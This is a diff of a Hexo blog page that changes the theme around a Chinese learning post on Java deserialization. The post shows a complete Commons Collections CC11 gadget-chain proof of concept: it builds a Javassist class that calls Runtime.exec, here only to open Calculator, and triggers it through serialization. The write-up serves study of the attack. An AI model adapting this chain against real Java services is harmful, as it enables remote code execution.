@@ -1,13 +1,179 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="referrer" content="no-referrer"><meta name="google-site-verification" content="YKwcqblwsZCg-ylX8b6YPzjmkIRadB3nD8IU3XMN6gg"><title>Java反序列化研究 | Boogiepop Doesn't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.ttf");
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Doesn't Laugh" type="application/atom+xml">
-</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Java反序列化研究</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-03-02T09:40:32.842Z" id="date"> 2023-03-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-03-02T09:40:54.445Z" id="updated"> 2023-03-02</time></div></span></div></div><hr><div id="post-content"><h1 id="0X0-前言"><a href="#0X0-前言" class="headerlink" title="0X0 前言"></a>0X0 前言</h1><p>入Web也有三个月了吧，在这三个月也学到了很多，终于步入了Java安全领域，打算在这里开一个新坑，研究Java的CC链和内存马，以及RMI和JNDI，框架等等，这是一开始想不到的高度，所以写的会尽可能基础详细，可以看懂，加油吧，路还长<br>参考视频：</p>
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Java反序列化研究 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Java反序列化研究 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:40:32.842Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">Java反序列化研究</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="0X0-前言"><a href="#0X0-前言" class="headerlink" title="0X0 前言"></a>0X0 前言</h1><p>入Web也有三个月了吧，在这三个月也学到了很多，终于步入了Java安全领域，打算在这里开一个新坑，研究Java的CC链和内存马，以及RMI和JNDI，框架等等，这是一开始想不到的高度，所以写的会尽可能基础详细，可以看懂，加油吧，路还长<br>参考视频：</p>
 <p>讲的究极无敌细腻，强推</p>
 <ul>
 <li>1X1 Java反序列化基础</li>
@@ -162,22 +328,149 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <h2 id="1X2-8-CC11"><a href="#1X2-8-CC11" class="headerlink" title="1X2.8 CC11"></a>1X2.8 CC11</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用javasist动态创建恶意字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 <p>具体分析参考：<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
 <h1 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h1><p>反弹shell解惑：</p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/">← Next Node.Js安全分析</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/03/02/PHP%20GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/">PHP GC回收机制及其利用 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0X0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0X0 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1X1-Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">1X1 Java原生序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1X1-1-%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E5%8D%B1%E9%99%A9%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">1X1.1 如何执行危险命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1x1-2-%E5%85%B1%E5%90%8C%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">1x1.2 共同条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x1-2-1-%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-number">2.2.1.</span> <span class="toc-text">1x1.2.1 入口类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-2-2-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">1X1.2.2 调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-2-3-%E6%89%A7%E8%A1%8C%E7%B1%BB"><span class="toc-number">2.2.3.</span> <span class="toc-text">1X1.2.3 执行类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1x1-3-%E4%BB%A5ysoserial%E7%9A%84URLDNS%E8%AF%B4%E8%B5%B7"><span class="toc-number">2.3.</span> <span class="toc-text">1x1.3 以ysoserial的URLDNS说起</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1x1-4-Java%E5%8F%8D%E5%B0%84-URLDNS%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">1x1.4 Java反射+URLDNS链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x1-4-1-%E5%85%88%E8%AE%B2%E8%AE%B2%E5%8F%8D%E5%B0%84"><span class="toc-number">2.4.1.</span> <span class="toc-text">1x1.4.1 先讲讲反射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-4-2-%E8%A7%A3%E5%86%B31x1-4%E7%9A%84%E7%96%91%E6%83%91"><span class="toc-number">2.4.2.</span> <span class="toc-text">1.1.4.2 解决1x1.4的疑惑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-4-3-%E5%8F%8D%E5%B0%84%E5%9C%A8Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.3.</span> <span class="toc-text">1X1.4.3 反射在Java反序列化中的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X1-5-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.5.</span> <span class="toc-text">1X1.5 JDK动态代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x1-5-1-JDK%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.5.1.</span> <span class="toc-text">1x1.5.1 JDK静态代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-5-2-%E5%9B%9E%E5%88%B0%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.5.2.</span> <span class="toc-text">1X1.5.2 回到动态代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-5-3-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">2.5.3.</span> <span class="toc-text">1X1.5.3 动态代理和反序列化的关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X1-6-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.6.</span> <span class="toc-text">1X1.6 类的动态加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-6-1%E7%B1%BB%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.6.1.</span> <span class="toc-text">1X1.6.1类加载与反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-6-2-%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6%EF%BC%88%E8%B7%9F%E8%BF%9B%E8%B0%83%E8%AF%95%EF%BC%89"><span class="toc-number">2.6.2.</span> <span class="toc-text">1X1.6.2 双亲委派机制（跟进调试）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-6-3-URLclassLoader%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.6.3.</span> <span class="toc-text">1X1.6.3 URLclassLoader任意类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-6-4-ClassLoader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.6.4.</span> <span class="toc-text">1X1.6.4 ClassLoader加载字节码执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X1-6-5-Unsafe%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">2.6.5.</span> <span class="toc-text">1X1.6.5 Unsafe加载字节码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">1X2 深入研究CC链（1-7）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-1-CC1"><span class="toc-number">4.1.</span> <span class="toc-text">1X2.1 CC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1X2-1-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.1.</span> <span class="toc-text">1X2.1.1 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X2-1-2-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E6%89%8B%E5%86%99EXP"><span class="toc-number">4.1.2.</span> <span class="toc-text">1X2.1.2 流程分析——手写EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1X2-1-3-%E5%AF%B9%E6%AF%94Ysoserial%E7%9A%84CC1"><span class="toc-number">4.1.3.</span> <span class="toc-text">1X2.1.3 对比Ysoserial的CC1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-2-CC6"><span class="toc-number">4.2.</span> <span class="toc-text">1X2.2 CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-3-CC3"><span class="toc-number">4.3.</span> <span class="toc-text">1X2.3 CC3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-4-CC4"><span class="toc-number">4.4.</span> <span class="toc-text">1X2.4 CC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-5-CC2"><span class="toc-number">4.5.</span> <span class="toc-text">1X2.5 CC2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-6-CC5"><span class="toc-number">4.6.</span> <span class="toc-text">1X2.6 CC5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-7-CC7"><span class="toc-number">4.7.</span> <span class="toc-text">1X2.7 CC7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1X2-8-CC11"><span class="toc-number">4.8.</span> <span class="toc-text">1X2.8 CC11</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">JDBC反序列化</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
- el: '#valine'
- , appId: '4KNp8mNp9RkLrDSktdFbmIO8-gzGzoHsz'
- , appKey: 'I3KhKOyWDf9eRRnVEAit98wt' , placeholder: 'This comment is sent by Penguin Logistics.'
- , path: window.location.pathname
-});code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
